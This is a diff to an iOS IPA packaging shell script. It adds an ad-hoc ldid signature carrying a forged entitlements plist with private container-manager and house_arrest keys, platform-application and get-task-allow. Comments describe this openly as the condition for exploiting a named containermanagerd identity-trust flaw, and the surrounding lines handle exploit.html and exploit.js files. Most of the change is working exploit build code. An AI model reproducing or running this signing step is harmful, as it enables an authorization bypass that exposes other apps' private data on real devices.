@@ -53,7 +53,28 @@ cp -r "$BUNDLE" "$PAYLOAD/${APP_NAME}.app"
 # unambiguous.
 rm -f "$PAYLOAD/${APP_NAME}.app/exploit.html" "$PAYLOAD/${APP_NAME}.app/exploit.js"
 if command -v ldid >/dev/null 2>&1; then
-    ldid -S "$PAYLOAD/${APP_NAME}.app/$APP_NAME" || true
+    # ad-hoc (ldid) signature: we control BOTH the entitlements and the
+    # CodeDirectory identifier. That is exactly the condition the
+    # containermanagerd / house_arrest "identity trust" flaw needs
+    # (CVE-2026-43689, CWE-862): MCM authorises the caller by the
+    # identifier, and with a dev/ad-hoc signature the identifier is free.
+    ENT_TMP="$(mktemp -d)/ent.plist"
+    cat > "$ENT_TMP" <<'ENTPLIST'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>com.apple.mobile.MobileHouseArrest</key><true/>
+    <key>com.apple.private.MobileContainerManager.allowed</key><true/>
+    <key>com.apple.private.security.storage.MobileContainerManager</key><true/>
+    <key>com.apple.rootless.storage.MobileContainerManager</key><true/>
+    <key>com.apple.private.security.container-required</key><false/>
+    <key>platform-application</key><true/>
+    <key>get-task-allow</key><true/>
+</dict>
+</plist>
+ENTPLIST
+    ldid -S"$ENT_TMP" "$PAYLOAD/${APP_NAME}.app/$APP_NAME" || ldid -S "$PAYLOAD/${APP_NAME}.app/$APP_NAME" || true
     echo "[IPA] подписано ldid -S"
 else
     echo "[IPA] WARN: ldid отсутствует — подпись пропущена."
